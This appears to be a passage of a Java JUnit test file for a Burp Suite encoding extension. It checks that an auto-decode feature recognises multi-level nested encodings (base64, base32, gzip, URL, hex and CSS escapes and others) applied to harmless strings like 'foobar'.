package burp;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

public class AutoDecodeNestedTests extends BaseHackvertorTest {

    @Test
    void testAsciiHexSpaceToCssEscapesToBase64_3Levels() {
        String input = "5c 35 41 5c 36 44 5c 33 39 5c 37 36 5c 35 39 5c 36 44 5c 34 36 5c 37 39";
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + input + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@css_escapes><@base64>foobar</@base64></@css_escapes></@ascii2hex>", decoded);
    }

    @Test
    void testUnicodeEscapesToBase32_2Levels() {
        String input = "\\u004D\\u005A\\u0058\\u0057\\u0036\\u0059\\u0054\\u0042\\u004F\\u0049\\u003D\\u003D\\u003D\\u003D\\u003D\\u003D";
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + input + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@unicode_escapes><@base32>foobar</@base32></@unicode_escapes>", decoded);
    }

    @Test
    void testGzipToBase64_2Levels() {
        String encoded = hackvertor.convert("<@gzip_compress><@base64>foobar</@base64></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base64>foobar</@base64></@gzip_compress>", decoded);
    }

    @Test
    void testDeflateToBase64_2Levels() {
        String encoded = hackvertor.convert("<@deflate_compress><@base64>foobar</@base64></@deflate_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@deflate_compress><@base64>foobar</@base64></@deflate_compress>", decoded);
    }

    @Test
    void testBase32ToBase64_2Levels() {
        String encoded = hackvertor.convert("<@base32><@base64>foobar</@base64></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@base64>foobar</@base64></@base32>", decoded);
    }

    @Test
    void testUrlencodeToBase64_2Levels() {
        String encoded = hackvertor.convert("<@urlencode_all><@base64>foobar</@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64>foobar</@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testHexEscapesToBase64_2Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base64>foobar</@base64></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64>foobar</@base64></@hex_escapes>", decoded);
    }

    @Test
    void testOctalEscapesToBase64_2Levels() {
        String encoded = hackvertor.convert("<@octal_escapes><@base64>foobar</@base64></@octal_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@octal_escapes><@base64>foobar</@base64></@octal_escapes>", decoded);
    }

    @Test
    void testHexEntitiesToBase64_2Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@base64>foobar</@base64></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@base64>foobar</@base64></@hex_entities>", decoded);
    }

    @Test
    void testAsciiHexWithSeparatorToBase64_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex(' ')><@base64>foobar</@base64></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@base64>foobar</@base64></@ascii2hex>", decoded);
    }

    @Test
    void testCharcodeToBase64_2Levels() {
        String encoded = hackvertor.convert("<@to_charcode><@base64>foobar</@base64></@to_charcode>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@to_charcode><@base64>foobar</@base64></@to_charcode>", decoded);
    }

    @Test
    void testCssEscapesToBase64_2Levels() {
        String encoded = hackvertor.convert("<@css_escapes><@base64>foobar</@base64></@css_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@css_escapes><@base64>foobar</@base64></@css_escapes>", decoded);
    }

    @Test
    void testUrlencodeToHexEscapesToBase64_3Levels() {
        String encoded = hackvertor.convert("<@urlencode_all><@hex_escapes><@base64>foobar</@base64></@hex_escapes></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@hex_escapes><@base64>foobar</@base64></@hex_escapes></@urlencode_not_plus>", decoded);
    }

    @Test
    void testBase64ToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64>foobar</@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64>foobar</@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase32ToBase32ToBase32_3Levels() {
        String encoded = hackvertor.convert("<@base32><@base32><@base32>foobar</@base32></@base32></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@base32><@base32>foobar</@base32></@base32></@base32>", decoded);
    }

    @Test
    void testUnicodeEscapesToHexEscapesToBase64_3Levels() {
        String encoded = hackvertor.convert("<@unicode_escapes><@hex_escapes><@base64>foobar</@base64></@hex_escapes></@unicode_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@unicode_escapes><@hex_escapes><@base64>foobar</@base64></@hex_escapes></@unicode_escapes>", decoded);
    }

    @Test
    void testHexEntitiesToUrlencodeToBase64_3Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@urlencode_all><@base64>foobar</@base64></@urlencode_all></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@urlencode_not_plus><@base64>foobar</@base64></@urlencode_not_plus></@hex_entities>", decoded);
    }

    @Test
    void testGzipToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@gzip_compress><@base64><@base64>foobar</@base64></@base64></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base64><@base64>foobar</@base64></@base64></@gzip_compress>", decoded);
    }

    @Test
    void testDeflateToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@deflate_compress><@base64><@base64>foobar</@base64></@base64></@deflate_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@deflate_compress><@base64><@base64>foobar</@base64></@base64></@deflate_compress>", decoded);
    }

    @Test
    void testBase64ToBase64ToBase64ToBase64_4Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase64x5_5Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase64x6_6Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase64x7_7Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase64x8_8Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase64x9_9Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase64x10_10Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testAsciiHexSpaceToBase64_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex(' ')><@base64>foobar</@base64></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@base64>foobar</@base64></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexSpaceToGzip_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex(' ')><@gzip_compress>foobar</@gzip_compress></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@gzip_compress>foobar</@gzip_compress></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexSpaceToDeflate_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex(' ')><@deflate_compress>foobar</@deflate_compress></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@deflate_compress>foobar</@deflate_compress></@ascii2hex>", decoded);
    }

    @Test
    void testBase32ToGzip_2Levels() {
        String encoded = hackvertor.convert("<@base32><@gzip_compress>foobar</@gzip_compress></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@gzip_compress>foobar</@gzip_compress></@base32>", decoded);
    }

    @Test
    void testBase32ToDeflate_2Levels() {
        String encoded = hackvertor.convert("<@base32><@deflate_compress>foobar</@deflate_compress></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@deflate_compress>foobar</@deflate_compress></@base32>", decoded);
    }

    @Test
    void testCssEscapesToBase32_2Levels() {
        String encoded = hackvertor.convert("<@css_escapes><@base32>foobar</@base32></@css_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@css_escapes><@base32>foobar</@base32></@css_escapes>", decoded);
    }

    @Test
    void testHexEscapesToBase32_2Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base32>foobar</@base32></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base32>foobar</@base32></@hex_escapes>", decoded);
    }

    @Test
    void testOctalEscapesToBase32_2Levels() {
        String encoded = hackvertor.convert("<@octal_escapes><@base32>foobar</@base32></@octal_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@octal_escapes><@base32>foobar</@base32></@octal_escapes>", decoded);
    }

    @Test
    void testHexEntitiesToBase32_2Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@base32>foobar</@base32></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@base32>foobar</@base32></@hex_entities>", decoded);
    }

    @Test
    void testUrlencodeToBase32_2Levels() {
        String encoded = hackvertor.convert("<@urlencode_all><@base32>foobar</@base32></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base32>foobar</@base32></@urlencode_not_plus>", decoded);
    }

    @Test
    void testOctalEscapesToHexEscapesToBase64_3Levels() {
        String encoded = hackvertor.convert("<@octal_escapes><@hex_escapes><@base64>foobar</@base64></@hex_escapes></@octal_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@octal_escapes><@hex_escapes><@base64>foobar</@base64></@hex_escapes></@octal_escapes>", decoded);
    }

    @Test
    void testHexEntitiesToHexEntitiesToBase64_3Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@hex_entities><@base64>foobar</@base64></@hex_entities></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@hex_entities><@base64>foobar</@base64></@hex_entities></@hex_entities>", decoded);
    }

    @Test
    void testBase32ToDeflateToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base32><@deflate_compress><@base64>foobar</@base64></@deflate_compress></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@deflate_compress><@base64>foobar</@base64></@deflate_compress></@base32>", decoded);
    }

    @Test
    void testAsciiHexSpaceToBase32ToGzip_3Levels() {
        String encoded = hackvertor.convert("<@ascii2hex(' ')><@base32><@gzip_compress>foobar</@gzip_compress></@base32></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@base32><@gzip_compress>foobar</@gzip_compress></@base32></@ascii2hex>", decoded);
    }

    @Test
    void testHexEscapesToBase64ToBase32ToGzip_4Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base64><@base32><@gzip_compress>foobar</@gzip_compress></@base32></@base64></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64><@base32><@gzip_compress>foobar</@gzip_compress></@base32></@base64></@hex_escapes>", decoded);
    }

    @Test
    void testGzipToBase32_2Levels() {
        String encoded = hackvertor.convert("<@gzip_compress><@base32>foobar</@base32></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base32>foobar</@base32></@gzip_compress>", decoded);
    }

    @Test
    void testDeflateToBase32_2Levels() {
        String encoded = hackvertor.convert("<@deflate_compress><@base32>foobar</@base32></@deflate_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@deflate_compress><@base32>foobar</@base32></@deflate_compress>", decoded);
    }

    @Test
    void testCharcodeToBase32_2Levels() {
        String encoded = hackvertor.convert("<@to_charcode><@base32>foobar</@base32></@to_charcode>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@to_charcode><@base32>foobar</@base32></@to_charcode>", decoded);
    }

    @Test
    void testBase32ToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base32><@base64><@base64>foobar</@base64></@base64></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@base64><@base64>foobar</@base64></@base64></@base32>", decoded);
    }

    @Test
    void testBase32ToGzipToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base32><@gzip_compress><@base64>foobar</@base64></@gzip_compress></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@gzip_compress><@base64>foobar</@base64></@gzip_compress></@base32>", decoded);
    }

    @Test
    void testUrlencodeToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@urlencode_all><@base64><@base64>foobar</@base64></@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64><@base64>foobar</@base64></@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testHexEntitiesToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@base64><@base64>foobar</@base64></@base64></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@base64><@base64>foobar</@base64></@base64></@hex_entities>", decoded);
    }

    @Test
    void testHexEscapesToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base64><@base64>foobar</@base64></@base64></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64><@base64>foobar</@base64></@base64></@hex_escapes>", decoded);
    }

    @Test
    void testOctalEscapesToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@octal_escapes><@base64><@base64>foobar</@base64></@base64></@octal_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@octal_escapes><@base64><@base64>foobar</@base64></@base64></@octal_escapes>", decoded);
    }

    @Test
    void testUnicodeEscapesToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@unicode_escapes><@base64><@base64>foobar</@base64></@base64></@unicode_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@unicode_escapes><@base64><@base64>foobar</@base64></@base64></@unicode_escapes>", decoded);
    }

    @Test
    void testCssEscapesToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@css_escapes><@base64><@base64>foobar</@base64></@base64></@css_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@css_escapes><@base64><@base64>foobar</@base64></@base64></@css_escapes>", decoded);
    }

    @Test
    void testBase64ToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base64><@base32><@base64>foobar</@base64></@base32></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base32><@base64>foobar</@base64></@base32></@base64>", decoded);
    }

    @Test
    void testBase32ToBase64ToBase32_3Levels() {
        String encoded = hackvertor.convert("<@base32><@base64><@base32>foobar</@base32></@base64></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@base64><@base32>foobar</@base32></@base64></@base32>", decoded);
    }

    @Test
    void testBase64ToBase64ToBase32_3Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base32>foobar</@base32></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base32>foobar</@base32></@base64></@base64>", decoded);
    }

    @Test
    void testBase32ToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base32><@base32><@base64>foobar</@base64></@base32></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@base32><@base64>foobar</@base64></@base32></@base32>", decoded);
    }

    @Test
    void testHexEntitiesToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@base32><@base64>foobar</@base64></@base32></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@base32><@base64>foobar</@base64></@base32></@hex_entities>", decoded);
    }

    @Test
    void testUrlencodeToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@urlencode_all><@base32><@base64>foobar</@base64></@base32></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base32><@base64>foobar</@base64></@base32></@urlencode_not_plus>", decoded);
    }

    @Test
    void testHexEscapesToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base32><@base64>foobar</@base64></@base32></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base32><@base64>foobar</@base64></@base32></@hex_escapes>", decoded);
    }

    @Test
    void testGzipToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@gzip_compress><@base32><@base64>foobar</@base64></@base32></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base32><@base64>foobar</@base64></@base32></@gzip_compress>", decoded);
    }

    @Test
    void testDeflateToBase32ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@deflate_compress><@base32><@base64>foobar</@base64></@base32></@deflate_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@deflate_compress><@base32><@base64>foobar</@base64></@base32></@deflate_compress>", decoded);
    }

    @Test
    void testBase64urlToBase64_2Levels() {
        String encoded = hackvertor.convert("<@base64url><@base64>foobar</@base64></@base64url>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64url><@base64>foobar</@base64></@base64url>", decoded);
    }

    @Test
    void testBase64urlToBase32_2Levels() {
        String encoded = hackvertor.convert("<@base64url><@base32>foobar</@base32></@base64url>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64url><@base32>foobar</@base32></@base64url>", decoded);
    }

    @Test
    void testBase64urlToGzip_2Levels() {
        String encoded = hackvertor.convert("<@base64url><@gzip_compress>foobar</@gzip_compress></@base64url>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64url><@gzip_compress>foobar</@gzip_compress></@base64url>", decoded);
    }

    @Test
    void testBase64urlToDeflate_2Levels() {
        String encoded = hackvertor.convert("<@base64url><@deflate_compress>foobar</@deflate_compress></@base64url>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64url><@deflate_compress>foobar</@deflate_compress></@base64url>", decoded);
    }

    @Test
    void testHexEscapesToBase64urlWithGzip_2Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base64url><@gzip_compress>foobar</@gzip_compress></@base64url></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64url><@gzip_compress>foobar</@gzip_compress></@base64url></@hex_escapes>", decoded);
    }

    @Test
    void testBase64urlToGzipToBase64_3Levels() {
        String encoded = hackvertor.convert("<@base64url><@gzip_compress><@base64>foobar</@base64></@gzip_compress></@base64url>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64url><@gzip_compress><@base64>foobar</@base64></@gzip_compress></@base64url>", decoded);
    }

    @Test
    void testBase58Single() {
        String encoded = hackvertor.convert("<@base58>hello world</@base58>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base58>hello world</@base58>", decoded);
    }

    @Test
    void testBase58ToBase64_2Levels() {
        String encoded = hackvertor.convert("<@base58><@base64>foobar</@base64></@base58>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base58><@base64>foobar</@base64></@base58>", decoded);
    }

    @Test
    void testHexEscapesToBase58_2Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@base58>hello world</@base58></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base58>hello world</@base58></@hex_escapes>", decoded);
    }

    @Test
    void testBase58ToBase32_2Levels() {
        String encoded = hackvertor.convert("<@base58><@base32>foobar</@base32></@base58>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base58><@base32>foobar</@base32></@base58>", decoded);
    }

    @Test
    void testQuotedPrintableSingle() {
        String encoded = hackvertor.convert("<@quoted_printable>hello=world</@quoted_printable>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@quoted_printable>hello=world</@quoted_printable>", decoded);
    }

    @Test
    void testQuotedPrintableToBase64_2Levels() {
        String encoded = hackvertor.convert("<@quoted_printable><@base64>test</@base64></@quoted_printable>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@quoted_printable><@base64>test</@base64></@quoted_printable>", decoded);
    }

    @Test
    void testHexEscapesToQuotedPrintable_2Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@quoted_printable>hello=world</@quoted_printable></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@quoted_printable>hello=world</@quoted_printable></@hex_escapes>", decoded);
    }

    @Test
    void testQuotedPrintableToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@quoted_printable><@base64><@base64>test</@base64></@base64></@quoted_printable>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@quoted_printable><@base64><@base64>test</@base64></@base64></@quoted_printable>", decoded);
    }

    @Test
    void testUtf7Single() {
